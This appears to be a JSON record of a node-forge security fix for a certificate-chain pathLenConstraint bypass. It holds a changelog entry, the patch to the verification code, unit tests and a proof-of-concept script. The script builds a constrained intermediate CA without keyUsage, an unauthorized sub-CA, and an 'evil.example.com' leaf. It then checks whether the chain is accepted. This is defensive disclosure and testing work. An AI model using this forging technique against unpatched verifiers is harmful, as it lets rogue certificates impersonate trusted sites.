{"id":"GHSA-h46v-rmh6-fq4f","axis":"advisories","repo":"digitalbazaar/forge","sha":"696db92348623e88cc63c35f0a89ede481d55ad0","parsed":{"files":[{"path":"CHANGELOG.md","lines":["@@ -129,6 +129,17 @@ Forge ChangeLog","   - Reported by @arpitjain099.","   - CVE ID: [CVE-TBD]()","   - GHSA ID: [GHSA-525v-9gp9-w22h](https://github.com/digitalbazaar/forge/security/advisories/GHSA-525v-9gp9-w22h)","+- **MODERATE**: `pathLenConstraint` bypass in certificate chain verification.","+  - `pki.verifyCertificateChain()` only enforces the `basicConstraints`","+    `pathLenConstraint` of a CA certificate when that certificate also has a","+    `keyUsage` extension. When a CA certificate with a `pathLenConstraint`","+    lacks `keyUsage`, chains with more intermediate CA certificates below it","+    than the constraint allows are accepted. The holder of such a constrained","+    CA's key, or anyone it issues a CA certificate to, can create subordinate","+    CAs whose certificates node-forge accepts as valid.","+  - Reported by @offset, @eddieran, Zion Boggan, and SongWriterOP GT.","+  - CVE ID: [CVE-TBD]()","+  - GHSA ID: [GHSA-h46v-rmh6-fq4f](https://github.com/digitalbazaar/forge/security/advisories/GHSA-h46v-rmh6-fq4f)"," - **LOW**: ASN.1 OID first arc truncation.","   - An Integer Overflow (CWE-190) vulnerability in node-forge versions 1.4.0","     and below lets `asn1.oidToDer()` encode an OID string with out of range","@@ -177,6 +188,8 @@ Forge ChangeLog"," - [x509] Use only the RFC 5280 `basicConstraints` OID (`2.5.29.19`) in","   certificate chain verification, not the deprecated OIDs that are also","   parsed as `basicConstraints`.","+- [x509] Enforce `basicConstraints` `pathLenConstraint` in chain verification","+  for CA certificates without a `keyUsage` extension."," "," ## 1.4.0 - 2026-03-24"," "],"additions":13,"deletions":0,"truncated":false},{"path":"lib/x509.js","lines":["@@ -3188,10 +3188,9 @@ pki.verifyCertificateChain = function(caStore, chain, options) {","           error: pki.certificateError.bad_certificate","         };","       }","-      // if error is not null and keyUsage is available, then we know it","-      // has keyCertSign and there is a basic constraints extension too,","-      // which means we can check pathLenConstraint (if it exists)","-      if(error === null && keyUsageExt !== null &&","+      // check pathLenConstraint (if it exists) regardless of whether the","+      // keyUsage extension is present (RFC 5280 6.1.4)","+      if(error === null && bcExt !== null &&","         'pathLenConstraint' in bcExt) {","         // pathLen is the maximum # of intermediate CA certs that can be","         // found between the current certificate and the end-entity (depth 0)"],"additions":3,"deletions":4,"truncated":false},{"path":"tests/pocs/ghsa-h46v-rmh6-fq4f.js","lines":["@@ -0,0 +1,84 @@","+// Security Advisory PoC","+//","+// https://github.com/digitalbazaar/forge/security/advisories/GHSA-h46v-rmh6-fq4f","+//","+// offset (@offset)","+","+const forge = require('../..');","+const pki = forge.pki;","+","+function generateKeyPair() {","+  return pki.rsa.generateKeyPair({ bits: 2048, e: 0x10001 });","+}","+","+// 1. Root CA (self-signed)","+const rootKeys = generateKeyPair();","+const rootCert = pki.createCertificate();","+rootCert.publicKey = rootKeys.publicKey;","+rootCert.serialNumber = '01';","+rootCert.validity.notBefore = new Date();","+rootCert.validity.notAfter = new Date();","+rootCert.validity.notAfter.setFullYear(rootCert.validity.notBefore.getFullYear() + 10);","+const rootAttrs = [{ name: 'commonName', value: 'Root CA' }];","+rootCert.setSubject(rootAttrs);","+rootCert.setIssuer(rootAttrs);","+rootCert.setExtensions([","+  { name: 'basicConstraints', cA: true, critical: true },","+  { name: 'keyUsage', keyCertSign: true, cRLSign: true, critical: true }","+]);","+rootCert.sign(rootKeys.privateKey, forge.md.sha256.create());","+","+// 2. Intermediate CA: pathLenConstraint=0 but NO keyUsage extension","+const intKeys = generateKeyPair();","+const intCert = pki.createCertificate();","+intCert.publicKey = intKeys.publicKey;","+intCert.serialNumber = '02';","+intCert.validity.notBefore = new Date();","+intCert.validity.notAfter = new Date();","+intCert.validity.notAfter.setFullYear(intCert.validity.notBefore.getFullYear() + 5);","+const intAttrs = [{ name: 'commonName', value: 'Intermediate CA' }];","+intCert.setSubject(intAttrs);","+intCert.setIssuer(rootAttrs);","+intCert.setExtensions([","+  { name: 'basicConstraints', cA: true, pathLenConstraint: 0, critical: true }","+  // NO keyUsage extension — this triggers the bypass","+]);","+intCert.sign(rootKeys.privateKey, forge.md.sha256.create());","+","+// 3. Unauthorized sub-CA signed by intermediate (violates pathLen=0)","+const subKeys = generateKeyPair();","+const subCert = pki.createCertificate();","+subCert.publicKey = subKeys.publicKey;","+subCert.serialNumber = '03';","+subCert.validity.notBefore = new Date();","+subCert.validity.notAfter = new Date();","+subCert.validity.notAfter.setFullYear(subCert.validity.notBefore.getFullYear() + 3);","+const subAttrs = [{ name: 'commonName', value: 'Unauthorized Sub-CA' }];","+subCert.setSubject(subAttrs);","+subCert.setIssuer(intAttrs);","+subCert.setExtensions([","+  { name: 'basicConstraints', cA: true, critical: true },","+  { name: 'keyUsage', keyCertSign: true, critical: true }","+]);","+subCert.sign(intKeys.privateKey, forge.md.sha256.create());","+","+// 4. Leaf cert signed by unauthorized sub-CA","+const leafKeys = generateKeyPair();","+const leafCert = pki.createCertificate();","+leafCert.publicKey = leafKeys.publicKey;","+leafCert.serialNumber = '04';","+leafCert.validity.notBefore = new Date();","+leafCert.validity.notAfter = new Date();","+leafCert.validity.notAfter.setFullYear(leafCert.validity.notBefore.getFullYear() + 1);","+leafCert.setSubject([{ name: 'commonName', value: 'evil.example.com' }]);","+leafCert.setIssuer(subAttrs);","+leafCert.sign(subKeys.privateKey, forge.md.sha256.create());","+","+// 5. Verify chain","+const caStore = pki.createCaStore([rootCert]);","+try {","+  pki.verifyCertificateChain(caStore, [leafCert, subCert, intCert]);","+  console.log('[VULNERABLE] Chain accepted — pathLenConstraint=0 NOT enforced');","+} catch (e) {","+  console.log('[SECURE] Chain rejected: ' + e.message);","+}"],"additions":84,"deletions":0,"truncated":false},{"path":"tests/unit/x509.js","lines":["@@ -1680,6 +1680,47 @@ var UTIL = require('../../lib/util');","         {name: 'keyUsage', keyCertSign: true}","       ]]), true);","     });","+","+    it('should enforce pathLenConstraint on CA certificates without keyUsage', function() {","+      // see GHSA-h46v-rmh6-fq4f and PoC in /tests/pocs/","+      function isPathLenError(err) {","+        return /pathLenConstraint violated/.test(err.message) &&","+          err.error === 'forge.pki.BadCertificate';","+      }","+","+      // root <- CA (pathLenConstraint 0, no keyUsage) <- CA <- leaf","+      ASSERT.throws(function() {","+        verifyPathLenChain([{pathLenConstraint: 0}, {}]);","+      }, isPathLenError);","+","+      // root <- CA (pathLenConstraint 1, no keyUsage) <- CA <- CA <- leaf","+      ASSERT.throws(function() {","+        verifyPathLenChain([{pathLenConstraint: 1}, {}, {}]);","+      }, isPathLenError);","+","+      // same as the first chain but with keyUsage","+      ASSERT.throws(function() {","+        verifyPathLenChain([{pathLenConstraint: 0, keyUsage: true}, {}]);","+      }, isPathLenError);","+    });","+","+    it('should verify chains within pathLenConstraint on CA certificates without keyUsage', function() {","+      // root <- CA (pathLenConstraint 0, no keyUsage) <- leaf","+      ASSERT.equal(verifyPathLenChain([{pathLenConstraint: 0}]), true);","+","+      // root <- CA (pathLenConstraint 1, no keyUsage) <- CA <- leaf","+      ASSERT.equal(verifyPathLenChain([{pathLenConstraint: 1}, {}]), true);","+","+      // every CA at its pathLenConstraint limit","+      ASSERT.equal(verifyPathLenChain([","+        {pathLenConstraint: 2},","+        {pathLenConstraint: 1},","+        {pathLenConstraint: 0}","+      ]), true);","+","+      // no pathLenConstraint and no keyUsage on any CA","+      ASSERT.equal(verifyPathLenChain([{}, {}, {}]), true);","+    });","   });"," ","   // TODO: add sha-512 and sha-256 fingerprint tests","@@ -1981,6 +2022,56 @@ var UTIL = require('../../lib/util');","     return result;","   }"," ","+  // creates a root CA, the given CAs (each issued by the previous one, the","+  // first by the root) and a leaf issued by the last CA, then verifies the","+  // chain; each CA option is {pathLenConstraint: <number>, keyUsage: <bool>}","+  // with both properties optional","+  function verifyPathLenChain(cas) {","+    var keys = {","+      privateKey: PKI.privateKeyFromPem(_pem.privateKey),","+      publicKey: PKI.publicKeyFromPem(_pem.publicKey)","+    };","+    var serialNumber = 0;","+    function issue(subject, issuer, extensions) {","+      var cert = PKI.createCertificate();","+      cert.publicKey = keys.publicKey;","+      cert.serialNumber = '0' + (++serialNumber);","+      cert.validity.notBefore = new Date();","+      cert.validity.notAfter = new Date();","+      cert.validity.notAfter.setFullYear(","+        cert.validity.notBefore.getFullYear() + 1);","+      cert.setSubject([{name: 'commonName', value: subject}]);","+      cert.setIssuer([{name: 'commonName', value: issuer}]);","+      cert.setExtensions(extensions);","+      cert.sign(keys.privateKey, MD.sha256.create());","+      // round-trip so that the parsed extensions are verified","+      return PKI.certificateFromPem(PKI.certificateToPem(cert));","+    }","+","+    var rootCert = issue('root', 'root', [","+      {name: 'basicConstraints', cA: true},","+      {name: 'keyUsage', keyCertSign: true, cRLSign: true}","+    ]);","+    var chain = [];","+    var issuer = 'root';","+    for(var i = 0; i < cas.length; ++i) {","+      var subject = 'ca' + i;","+      var bcExt = {name: 'basicConstraints', cA: true};","+      if('pathLenConstraint' in cas[i]) {","+        bcExt.pathLenConstraint = cas[i].pathLenConstraint;","+      }","+      var extensions = [bcExt];","+      if(cas[i].keyUsage) {","+        extensions.push({name: 'keyUsage', keyCertSign: true, cRLSign: true});","+      }","+      chain.unshift(issue(subject, issuer, extensions));","+      issuer = subject;","+    }","+    chain.unshift(issue('leaf', issuer, []));","+","+    return PKI.verifyCertificateChain(PKI.createCaStore([rootCert]), chain);","+  }","+","   function createCertificate(options) {","     var publicKey = options.publicKey;","     var signingKey = options.signingKey;",""],"additions":91,"deletions":0,"truncated":false}],"additions":191,"deletions":4,"truncated":false,"file_count":4},"error":null,"fetched_at":"2026-11-11T15:37:40.063025+00:00"}